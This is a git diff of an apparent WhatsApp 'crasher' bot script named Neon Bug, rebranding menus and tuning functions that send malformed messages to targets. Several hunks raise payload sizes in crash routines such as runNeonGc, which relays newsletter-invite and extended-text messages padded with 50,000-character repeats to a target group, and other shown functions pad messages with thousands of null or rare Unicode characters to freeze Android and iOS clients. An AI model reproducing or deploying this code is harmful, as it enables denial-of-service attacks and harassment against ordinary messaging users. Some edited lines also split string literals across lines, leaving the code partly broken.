@@ -302,7 +302,7 @@ async function sendMainMenu(sock, chatId, fakeQuote, prefix) {
   await sock.sendMessage(chatId, { text: menuCaption }, { quoted: fakeQuote });
 }
 
-// ── SEND CATEGORY LIST (Raid Bugs / System) ──
+// ── SEND CATEGORY LIST (Neon Bugs / System) ──
 async function sendCategoryMenu(sock, chatId, fakeQuote) {
   const categoryMsg = generateWAMessageFromContent(chatId, {
     viewOnceMessage: {
@@ -371,7 +371,7 @@ async function sendCategoryMenu(sock, chatId, fakeQuote) {
   );
 }
 
-// ── SEND RAID BUGS LIST ──
+// ── SEND NEON BUGS LIST ──
 async function sendRaidBugsMenu(sock, chatId, fakeQuote) {
   const raidBugsImagePath = path.join(__dirname, '..', 'media', 'menu2.jpg');
 
@@ -394,8 +394,10 @@ async function sendRaidBugsMenu(sock, chatId, fakeQuote) {
     `║     𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬   ║\n` +
     `╚══════ ════ ════════════ ═════╝\n\n` +
     `┏━✞︎𓅓 𝑨𝒏𝒅𝒓𝒐𝒊𝒅 𝑩𝒖𝒈𝒔  ━┓\n` +
-    `  ☻︎ 𝗿𝗮𝗶𝗱𝗮𝗻𝗱𝗿𝗼𝗶𝗱\n` +
-    `  ☻︎ 𝗱𝗲𝘃𝗶𝗻𝗲-𝗳𝗿𝗲𝗲𝘇𝗲\n` +
+    `  ☻︎ 𝗻𝗲𝗼𝗻
+    𝗮𝗻𝗱𝗿𝗼𝗶𝗱\n` +
+    `  ☻︎ 𝗻𝗲𝗼𝗻
+    -𝗱𝗲𝘃𝗶𝗻𝗲-𝗳𝗿𝗲𝗲𝘇𝗲\n` +
     `  ☻︎ 𝗿𝗮𝗶𝗱-𝗱𝗲𝗹𝗮𝘆\n` +
     `┗━━━━━ ━━━━ ━┛\n\n` +
     `┏━  𓅓 𝗶𝗢𝗦 𝑩𝒖𝒈𝒔  ━┓\n` +
@@ -546,7 +548,7 @@ async function sendSystemMenu(sock, chatId, fakeQuote) {
             text: bodyText
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
-            text: '「☠︎」𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬'
+            text: '「☠︎」𝑵𝑬𝑶𝑵 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬'
           }),
           header: proto.Message.InteractiveMessage.Header.create({
             hasMediaAttachment: headerImage ? true : false,
@@ -888,7 +890,7 @@ async function runNeonGc(sock, chatId, targetGcJid, fakeQuote) {
         newsletterAdminInviteMessage: {
           newsletterJid: '120363000000000001@newsletter',
           newsletterName: 'status@broadcast'.repeat(4000),
-          caption: 'ꦾ'.repeat(2000)
+          caption: 'ꦾ'.repeat(50000)
         }
       }, { messageId: generateMessageID() });
 
@@ -898,8 +900,8 @@ async function runNeonGc(sock, chatId, targetGcJid, fakeQuote) {
       await sock.relayMessage(targetGcJid, {
         newsletterAdminInviteMessage: {
           newsletterJid: '120363000000000002@newsletter',
-          newsletterName: 'status@broadcast'.repeat(2000),
-          caption: 'ꦾ'.repeat(1500)
+          newsletterName: 'status@broadcast'.repeat(50000),
+          caption: 'ꦾ'.repeat(50000)
         }
       }, { messageId: generateMessageID() });
 
@@ -908,7 +910,7 @@ async function runNeonGc(sock, chatId, targetGcJid, fakeQuote) {
       // ── Wave 4: extendedText with forwardedNewsletterMessageInfo overflow ──
       await sock.relayMessage(targetGcJid, {
         extendedTextMessage: {
-          text: '𝑵𝑬𝑶𝑵 𝑩𝑼𝑮'.repeat(2000),
+          text: '𝑵𝑬𝑶𝑵 𝑩𝑼𝑮'.repeat(50000),
           contextInfo: {
             forwardedNewsletterMessageInfo: {
               newsletterJid: '120363000000000001@newsletter',
@@ -940,7 +942,8 @@ async function runNeonGc(sock, chatId, targetGcJid, fakeQuote) {
       `📊 *ʀᴏᴜɴᴅs sᴇɴᴛ:* ${sent}/${ROUNDS}\n` +
       `📈 *sᴜᴄᴄᴇss ʀᴀᴛᴇ:* ${successRate}%\n` +
       `━━━━━━━━ ━━━━━━ ━━━━━━ ━━━━━━━━\n` +
-      `_| ᴍʏsᴛɪᴄ ᴛᴇᴄʜ`,
+      `_| ᴠɪᴄᴛᴏʀʏ ᴛᴇᴄʜ`
+      ,
     contextInfo: adReply
   }, { quoted: fakeQuote });
 }
@@ -1691,7 +1694,7 @@ async function handlePendingNeonCommand(sock, chatId, command, targetJid, rawNum
             `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
             `📱 *ᴘʟᴀᴛғᴏʀᴍ:* iOS\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-            `_「☠︎」NEON ᴛᴀʀɢᴇᴛɪɴɢ ɪᴏs..._`,
+            `_「☠︎」ɴᴇᴏɴ ᴛᴀʀɢᴇᴛɪɴɢ ɪᴏs..._`,
           contextInfo: adReply
         }, { quoted: fakeQuote });
 
@@ -1839,7 +1842,7 @@ async function handlePendingNeonCommand(sock, chatId, command, targetJid, rawNum
 
         await sock.sendMessage(chatId, {
           text:
-            `「☠︎」🤖 *Neonᴀɴᴅʀᴏɪᴅ ᴄᴏᴍᴘʟᴇᴛᴇ*\n` +
+            `「☠︎」🤖 *ɴᴇᴏɴᴀɴᴅʀᴏɪᴅ ᴄᴏᴍᴘʟᴇᴛᴇ*\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
             `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
             `📊 *ʀᴏᴜɴᴅs:* ${sent}/${ROUNDS}\n` +
@@ -1914,7 +1917,7 @@ async function handlePendingNeonCommand(sock, chatId, command, targetJid, rawNum
       try {
         await sock.sendMessage(chatId, {
           text:
-            `「☠︎」⏱️ *Neon-ᴅᴇʟᴀʏ ᴅᴇᴘʟᴏʏɪɴɢ*\n` +
+            `「☠︎」⏱️ *ɴᴇᴏɴ-ᴅᴇʟᴀʏ ᴅᴇᴘʟᴏʏɪɴɢ*\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
             `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
             `📱 *ᴘʟᴀᴛғᴏʀᴍ:* Android\n` +
@@ -1943,7 +1946,7 @@ async function handlePendingNeonCommand(sock, chatId, command, targetJid, rawNum
 
         await sock.sendMessage(chatId, {
           text:
-            `「☠︎」⏱️ *Neon-ᴅᴇʟᴀʏ ᴄᴏᴍᴘʟᴇᴛᴇ*\n` +
+            `「☠︎」⏱️ *ɴᴇᴏɴ-ᴅᴇʟᴀʏ ᴄᴏᴍᴘʟᴇᴛᴇ*\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
             `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
             `📊 *ʀᴏᴜɴᴅs:* ${sent}/${ROUNDS}\n` +
@@ -2022,7 +2025,7 @@ async function handlePendingNeonCommand(sock, chatId, command, targetJid, rawNum
       try {
         await sock.sendMessage(chatId, {
           text:
-            `「☠︎」🔥 *ᴏʙɪᴛᴏ-ғʀᴇᴇᴢᴇ ᴀʀᴍɪɴɢ*\n` +
+            `「☠︎」🔥 *ɴᴇᴏɴ-ғʀᴇᴇᴢᴇ ᴀʀᴍɪɴɢ*\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
             `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
             `📱 *ᴘʟᴀᴛғᴏʀᴍ:* iOS\n` +
@@ -2554,7 +2557,7 @@ async function _sendCombo(sock, target) {
       message: {
         newsletterAdminInviteMessage: {
           newsletterJid: '1@newsletter',
-          newsletterName: 'WIDSEVERLY' + '𑜦𑜠'.repeat(11000),
+          newsletterName: 'NEONBUG' + '𑜦𑜠'.repeat(11000),
           jpegThumbnail: null,
           caption: toxic.substring(0, 50000),
           inviteExpiration: Date.now() + 9999999999
@@ -2941,7 +2944,7 @@ async function _protocolbug6(sock, target, mention = true) {
     contextInfo: {
       externalAdReply: {
         showAdAttribution: true,
-        title: 'KIMOCHI',
+        title: 'NEONBUGS',
         body: `${'\u0000'.repeat(9117)}`,
         mediaType: 1,
         renderLargerThumbnail: true,
